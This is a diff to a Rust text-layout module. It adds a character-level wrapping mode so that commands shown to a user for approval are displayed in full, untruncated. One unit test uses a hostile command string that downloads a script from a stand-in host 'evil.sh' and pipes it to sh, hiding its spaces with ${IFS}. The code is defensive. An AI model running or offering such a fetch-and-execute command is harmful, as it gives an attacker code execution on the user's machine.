@@ -24,6 +24,15 @@
 //! otherwise: a branch or a plugin id is known by what it starts with, a path
 //! by what it ends in, and a paragraph that names a file — the one that could
 //! not be written, the one that could not be read — keeps the end.
+//!
+//! # Or by character, for text that is not prose
+//!
+//! A command a person is asked to allow is not a paragraph: its spaces are
+//! not where it may be broken, a run with none in it is as likely as a word,
+//! and an ellipsis over the end of one hides exactly the part that does the
+//! damage. [`Paragraph::breaking_anywhere`] breaks such text at whichever
+//! character the line runs out at, keeps every space where it was — leading
+//! ones included — and cuts nothing.
 
 use std::borrow::Cow;
 
@@ -49,6 +58,9 @@ pub struct Paragraph {
     properties: Properties,
     color: Color,
     cut: Cut,
+    /// Whether lines break at any character, keeping every one: see
+    /// [`Paragraph::breaking_anywhere`].
+    anywhere: bool,
     lines: Vec<Line>,
     size: Option<Vector2F>,
     origin: Option<Point>,
@@ -64,6 +76,7 @@ impl Paragraph {
             line_height_ratio: DEFAULT_UI_LINE_HEIGHT_RATIO,
             properties: Properties::default(),
             cut: Cut::End,
+            anywhere: false,
             color: Color::WHITE,
             lines: Vec::new(),
             size: None,
@@ -85,6 +98,19 @@ impl Paragraph {
     /// which file.
     pub fn with_cut(mut self, cut: Cut) -> Self {
         self.cut = cut;
+        self
+    }
+
+    /// Breaks lines at whichever character the width runs out at, rather
+    /// than between words, and keeps every character the text has: no space
+    /// is dropped at a break or before the first word, and no line is cut.
+    ///
+    /// For text whose every character matters and whose spaces say nothing
+    /// about where it may be broken — a command, set in a monospace family.
+    /// A line holds one character at least, so a single glyph wider than the
+    /// box is the one thing that overflows it.
+    pub fn breaking_anywhere(mut self) -> Self {
+        self.anywhere = true;
         self
     }
 
@@ -170,6 +196,28 @@ fn break_lines(text: &str, width: f32, x_of: impl Fn(usize) -> f32) -> Vec<std::
     lines
 }
 
+/// Where each line of `text` starts and ends when it may break at any
+/// character, given the x of every character: the longest run that fits on
+/// each line, one character at least, every byte of `text` in exactly one
+/// line.
+fn break_characters(
+    text: &str,
+    width: f32,
+    x_of: impl Fn(usize) -> f32,
+) -> Vec<std::ops::Range<usize>> {
+    let mut lines = Vec::new();
+    let mut start = 0;
+    for (index, character) in text.char_indices() {
+        let end = index + character.len_utf8();
+        if index > start && x_of(end) - x_of(start) > width {
+            lines.push(start..index);
+            start = index;
+        }
+    }
+    lines.push(start..text.len());
+    lines
+}
+
 impl Element for Paragraph {
     fn layout(
         &mut self,
@@ -182,7 +230,25 @@ impl Element for Paragraph {
         // hand back the same single line and no more information.
         let max_width = constraint.max.x();
         let measured = self.shape(&self.text, ctx);
-        let ranges = break_lines(&self.text, max_width, |index| measured.x_for_index(index));
+        let ranges = if self.anywhere {
+            // Asked at every character rather than every word, so read off
+            // the glyphs once and searched, rather than walked from the
+            // start each time as `x_for_index` does.
+            let mut at: Vec<(usize, f32)> = measured
+                .runs
+                .iter()
+                .flat_map(|run| run.glyphs.iter())
+                .map(|glyph| (glyph.index, glyph.position_along_baseline.x()))
+                .collect();
+            // In text order, which a right-to-left run is not drawn in.
+            at.sort_by_key(|(glyph, _)| *glyph);
+            break_characters(&self.text, max_width, |index| {
+                let first = at.partition_point(|(glyph, _)| *glyph < index);
+                at.get(first).map_or(measured.width, |(_, x)| *x)
+            })
+        } else {
+            break_lines(&self.text, max_width, |index| measured.x_for_index(index))
+        };
 
         self.lines = ranges
             .into_iter()
@@ -191,8 +257,9 @@ impl Element for Paragraph {
                 let line = self.shape(text, ctx);
                 // Only a word that overran a finite width is cut: an unbounded
                 // axis is a flex measuring, and the breaking above leaves no
-                // other line wider than it was given.
-                if max_width.is_finite() && line.width > max_width {
+                // other line wider than it was given. Text broken anywhere is
+                // never cut: its every character is what it is shown for.
+                if !self.anywhere && max_width.is_finite() && line.width > max_width {
                     cut_line(text, &line, self.cut, max_width, |text, width| {
                         self.shape_within(text, width, ctx)
                     })
@@ -247,7 +314,7 @@ impl Element for Paragraph {
 
 #[cfg(test)]
 mod tests {
-    use super::break_lines;
+    use super::{break_characters, break_lines};
 
     /// The stub shaper's arithmetic: every character is half the font size
     /// wide, so a character is one unit here.
@@ -301,5 +368,33 @@ mod tests {
         let broken = break_lines(text, 8., x_of(text));
 
         assert_eq!(broken, [0..7, 8..13]);
+    }
+
+    fn pieces(text: &str, width: f32) -> Vec<&str> {
+        break_characters(text, width, x_of(text))
+            .into_iter()
+            .map(|range| &text[range])
+            .collect()
+    }
+
+    #[test]
+    fn broken_anywhere_a_run_with_no_space_wraps_and_keeps_its_end() {
+        assert_eq!(
+            pieces("echo${IFS}AAAA;curl${IFS}evil.sh|sh", 10.),
+            ["echo${IFS}", "AAAA;curl$", "{IFS}evil.", "sh|sh"]
+        );
+    }
+
+    #[test]
+    fn broken_anywhere_every_space_stays_where_it_was() {
+        // Leading spaces, and the spaces a break falls on, are part of what
+        // is shown: dropping one would change which command is read.
+        let text = "  a  b    c";
+        let broken = pieces(text, 4.);
+        assert_eq!(broken, ["  a ", " b  ", "  c"]);
+        assert_eq!(broken.concat(), text);
+        assert_eq!(pieces("", 4.), [""]);
+        // A line holds one character at least, even one wider than the box.
+        assert_eq!(pieces("修正", 0.5), ["修", "正"]);
     }
 }
